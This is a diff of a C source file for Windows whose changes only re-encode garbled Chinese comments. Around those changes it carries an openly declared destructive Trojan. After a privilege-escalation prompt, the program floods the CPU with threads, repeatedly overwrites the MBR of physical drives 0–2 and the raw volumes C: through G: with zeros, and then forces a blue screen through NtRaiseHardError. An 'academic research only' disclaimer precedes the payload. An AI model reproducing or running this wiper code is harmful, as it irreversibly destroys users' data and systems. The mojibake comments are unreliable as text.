@@ -1,19 +1,19 @@
-//CµÄÔ­ÉúµÄÍ·ÎÄ¼þ
+//Cçš„åŽŸç”Ÿçš„å¤´æ–‡ä»¶
 #include<stdio.h>
 #include<stdlib.h>
 
-//²Ù×÷ÎÄ¼þµÄÍ·ÎÄ¼þ
+//æ“ä½œæ–‡ä»¶çš„å¤´æ–‡ä»¶
 #include<dirent.h>
 #include<direct.h>
 
-//¶àÏß³ÌºÍ¶à½ø³ÌµÄÓÐÎÄ¼þ
+//å¤šçº¿ç¨‹å’Œå¤šè¿›ç¨‹çš„æœ‰æ–‡ä»¶
 #include<unistd.h>
 #include<process.h>
 
-//Ê¹ÓÃWindowsAPI»ñÈ¡¹ÜÀíÔ±È¨ÏÞ
+//ä½¿ç”¨WindowsAPIèŽ·å–ç®¡ç†å‘˜æƒé™
 #include<Windows.h>
 
-//»ñÈ¡¹ÜÀíÔ±È¨ÏÞµÄº¯Êý
+//èŽ·å–ç®¡ç†å‘˜æƒé™çš„å‡½æ•°
 VOID Admin_Run(LPCSTR exe, LPCSTR param, INT nShow = SW_HIDE)
 {
 	SHELLEXECUTEINFO ShExecInfo;
@@ -31,7 +31,7 @@ VOID Admin_Run(LPCSTR exe, LPCSTR param, INT nShow = SW_HIDE)
 	return;
 }
 
-//Õ¼ÂúCPUµÄÏß³Ìº¯Êý1
+//å æ»¡CPUçš„çº¿ç¨‹å‡½æ•°1
 void TheCpuKill(void* p) {
 	int* a;
 	while (1) {
@@ -39,56 +39,56 @@ void TheCpuKill(void* p) {
 	}
 }
 
-//Õ¼ÂúCPUµÄÏß³Ìº¯Êý2
+//å æ»¡CPUçš„çº¿ç¨‹å‡½æ•°2
 void TheCpuKill_func(void* p) {
 	while (1) {
 		for (int i; i < 800; i++);
 	}
 }
 
-//¶ÔÎïÀí´ÅÅÌºÍÓ²ÅÌ½øÐÐ¸ÄÐ´µÄº¯Êý
+//å¯¹ç‰©ç†ç£ç›˜å’Œç¡¬ç›˜è¿›è¡Œæ”¹å†™çš„å‡½æ•°
 void TheWriteDisk(void* p) {
-	//·´¸´½øÐÐ¸ÄÐ´
+	//åå¤è¿›è¡Œæ”¹å†™
 	while (1) {
 		char TheDiskShell[512] = "\x00\x00\x00\x00\x00";
-		//¶ÔÎïÀí´ÅÅÌ0(MBR)½øÐÐ¸ÄÐ´
+		//å¯¹ç‰©ç†ç£ç›˜0(MBR)è¿›è¡Œæ”¹å†™
 		FILE* WriteMbr = fopen("\\\\.\\PhysicalDrive0", "rb+");
 		fwrite(TheDiskShell, sizeof(TheDiskShell), 1, WriteMbr);
-		//¶ÔÎïÀí´ÅÅÌ1½øÐÐ¸ÄÐ´
+		//å¯¹ç‰©ç†ç£ç›˜1è¿›è¡Œæ”¹å†™
 		FILE* WriteDrive1 = fopen("\\\\.\\PhysicalDrive1", "rb+");
 		fwrite(TheDiskShell, sizeof(TheDiskShell), 1, WriteDrive1);
-		//¶ÔÎïÀí´ÅÅÌ2½øÐÐ¸ÄÐ´
+		//å¯¹ç‰©ç†ç£ç›˜2è¿›è¡Œæ”¹å†™
 		FILE* WriteDrive2 = fopen("\\\\.\\PhysicalDrive2", "rb+");
 		fwrite(TheDiskShell, sizeof(TheDiskShell), 1, WriteDrive2);
 
-		//½«Êý¾ÝÐ´Èë´ÅÅÌ
+		//å°†æ•°æ®å†™å…¥ç£ç›˜
 		fclose(WriteMbr);
 		fclose(WriteDrive1);
 		fclose(WriteDrive2);
 	}
 }
 
-//¶ÔÊµ¼Ê´ÅÅÌºÍÓ²ÅÌ½øÐÐ¸ÄÐ´µÄº¯Êý,ÓÃ\x00¸²¸ÇËùÓÐÓ²ÅÌ
+//å¯¹å®žé™…ç£ç›˜å’Œç¡¬ç›˜è¿›è¡Œæ”¹å†™çš„å‡½æ•°,ç”¨\x00è¦†ç›–æ‰€æœ‰ç¡¬ç›˜
 void TheWriteDrive(void* p) {
-	//·´¸´½øÐÐ¸ÄÐ´
+	//åå¤è¿›è¡Œæ”¹å†™
 	while (1) {
 		char TheDiskShell[512] = "\x00\x00\x00\x00\x00";
-		//¶ÔCÅÌ½øÐÐ¸ÄÐ´,ÓÃ\x00¸ñÊ½»¯CÅÌ
+		//å¯¹Cç›˜è¿›è¡Œæ”¹å†™,ç”¨\x00æ ¼å¼åŒ–Cç›˜
 		FILE* WriteDisk_C = fopen("\\\\.\\C:", "wb+");
 		fwrite(TheDiskShell, sizeof(TheDiskShell), 1, WriteDisk_C);
-		//¶ÔDÅÌ½øÐÐ¸ÄÐ´,ÓÃ\x00¸ñÊ½»¯DÅÌ
+		//å¯¹Dç›˜è¿›è¡Œæ”¹å†™,ç”¨\x00æ ¼å¼åŒ–Dç›˜
 		FILE* WriteDisk_D = fopen("\\\\.\\D:", "wb+");
 		fwrite(TheDiskShell, sizeof(TheDiskShell), 1, WriteDisk_D);
-		//¶ÔDÅÌ½øÐÐ¸ÄÐ´,ÓÃ\x00¸ñÊ½»¯EÅÌ
+		//å¯¹Dç›˜è¿›è¡Œæ”¹å†™,ç”¨\x00æ ¼å¼åŒ–Eç›˜
 		FILE* WriteDisk_E = fopen("\\\\.\\E:", "wb+");
 		fwrite(TheDiskShell, sizeof(TheDiskShell), 1, WriteDisk_E);
-		//¶ÔDÅÌ½øÐÐ¸ÄÐ´,ÓÃ\x00¸ñÊ½»¯FÅÌ
+		//å¯¹Dç›˜è¿›è¡Œæ”¹å†™,ç”¨\x00æ ¼å¼åŒ–Fç›˜
 		FILE* WriteDisk_F = fopen("\\\\.\\F:", "wb+");
 		fwrite(TheDiskShell, sizeof(TheDiskShell), 1, WriteDisk_F);
-		//¶ÔDÅÌ½øÐÐ¸ÄÐ´,ÓÃ\x00¸ñÊ½»¯DÅÌ
+		//å¯¹Dç›˜è¿›è¡Œæ”¹å†™,ç”¨\x00æ ¼å¼åŒ–Dç›˜
 		FILE* WriteDisk_G = fopen("\\\\.\\G:", "wb+");
 		fwrite(TheDiskShell, sizeof(TheDiskShell), 1, WriteDisk_G);
-		//½øÐÐ²Ù×÷ºó½«ËùÓÐµÄÊý¾ÝÐ´Èë´ÅÅÌ,Ó²ÅÌ
+		//è¿›è¡Œæ“ä½œåŽå°†æ‰€æœ‰çš„æ•°æ®å†™å…¥ç£ç›˜,ç¡¬ç›˜
 		fclose(WriteDisk_C); fclose(WriteDisk_D);
 		fclose(WriteDisk_E); fclose(WriteDisk_F);
 		fclose(WriteDisk_G);
@@ -102,43 +102,43 @@ void TheWindowsBOSD(void) {
 	unsigned char ErrKill;
 	long unsigned int HDErr;
 	((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjPriv)(0x13, true, false, &ErrKill);
-	//À¶ÆÁ´úÂë0xffffffff(²»´æÔÚµÄ´úÂë)
+	//è“å±ä»£ç 0xffffffff(ä¸å­˜åœ¨çš„ä»£ç )
 	((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardErr)(0xf0f0f0f0, 0, 0, 0, 6, &HDErr);
 }
 
-//ÌáÊ¾¿òµÄÄÚÈÝ
+//æç¤ºæ¡†çš„å†…å®¹
 /*
-ÕâÊÇÒ»¸ö¾ßÓÐÆÆ»µÐÔµÄÌØÂåÒÁÄ¾Âí
-´Ë³ÌÐò½öÏÞÓÚÑ§ÊõÑÐ¾¿£¬»òÕß×¨Òµ²âÊÔ¡£
-Èç¹û¶ÔÄãµÄ¼ÆËã»úÔì³ÉÁËËðÊ§£¬±¾ÈË½«²»¸¶ÈÎºÎÔðÈÎ¡£
-Èç¹ûÄãÐèÒª²âÊÔ´Ë³ÌÐòÇëÔÚÐéÄâ»úÀï½øÐÐ²âÊÔ¡£
-×¢£º´Ë³ÌÐò»á×Ô¶¯ÉêÇëÌáÈ¨
+è¿™æ˜¯ä¸€ä¸ªå…·æœ‰ç ´åæ€§çš„ç‰¹æ´›ä¼Šæœ¨é©¬
+æ­¤ç¨‹åºä»…é™äºŽå­¦æœ¯ç ”ç©¶ï¼Œæˆ–è€…ä¸“ä¸šæµ‹è¯•ã€‚
+å¦‚æžœå¯¹ä½ çš„è®¡ç®—æœºé€ æˆäº†æŸå¤±ï¼Œæœ¬äººå°†ä¸ä»˜ä»»ä½•è´£ä»»ã€‚
+å¦‚æžœä½ éœ€è¦æµ‹è¯•æ­¤ç¨‹åºè¯·åœ¨è™šæ‹Ÿæœºé‡Œè¿›è¡Œæµ‹è¯•ã€‚
+æ³¨ï¼šæ­¤ç¨‹åºä¼šè‡ªåŠ¨ç”³è¯·ææƒ
 */
 int main(int argc, char* argv[]) {
-	if (argc == 1) //³õ´ÎÔËÐÐ£¬¼´Ë«»÷EXE
+	if (argc == 1) //åˆæ¬¡è¿è¡Œï¼Œå³åŒå‡»EXE
 	{
 		Admin_Run(argv[0], "2");
 		return 1;
 	}
-	else if (argc == 2) //ÔÙ´ÎÔËÐÐ,¼´ÉÏÃæÄÇ¸öManagerRun
+	else if (argc == 2) //å†æ¬¡è¿è¡Œ,å³ä¸Šé¢é‚£ä¸ªManagerRun
 	{
 		if (MessageBox(NULL, "This is a destructive Trojan horse\n\
 This program is limited to academic research or professional testing.\n\
 If you cause damage to your computer, I will not pay any responsibility.\n\
 If you need to test this program, please test it in the virtual machine.\n\r\
 Note: This procedure will automatically apply for privilege escalation", "Hello world program", MB_YESNO + 48) == 6) {
-			//·´¸´½øÐÐ²Ù×÷,ÈÃ¼ÆËã»ú±ÀÀ£
+			//åå¤è¿›è¡Œæ“ä½œ,è®©è®¡ç®—æœºå´©æºƒ
 			for (int i; i < 20; i++) {
-				//´´½¨Á½¸öÕ¼ÂúRAMµÄÏß³Ì
+				//åˆ›å»ºä¸¤ä¸ªå æ»¡RAMçš„çº¿ç¨‹
 				_beginthread(TheCpuKill, 0, NULL);
 				_beginthread(TheCpuKill, 0, NULL);
-				//´´½¨Á½¸öÕ¼ÂúCPUµÄÏß³Ì
+				//åˆ›å»ºä¸¤ä¸ªå æ»¡CPUçš„çº¿ç¨‹
 				_beginthread(TheCpuKill_func, 0, NULL);
 				_beginthread(TheCpuKill_func, 0, NULL);
 
-				//´´½¨¶ÔÎïÀí´ÅÅÌ½øÐÐ¸ÄÐ´µÄÏß³Ì
+				//åˆ›å»ºå¯¹ç‰©ç†ç£ç›˜è¿›è¡Œæ”¹å†™çš„çº¿ç¨‹
 				_beginthread(TheWriteDisk, 0, NULL);
-				//´´½¨¶Ô´ÅÅÌ,Ó²ÅÌ½øÐÐ¸ÄÐ´µÄÏß³Ì
+				//åˆ›å»ºå¯¹ç£ç›˜,ç¡¬ç›˜è¿›è¡Œæ”¹å†™çš„çº¿ç¨‹
 				_beginthread(TheWriteDrive, 0, NULL);
 			}
 			TheWindowsBOSD();
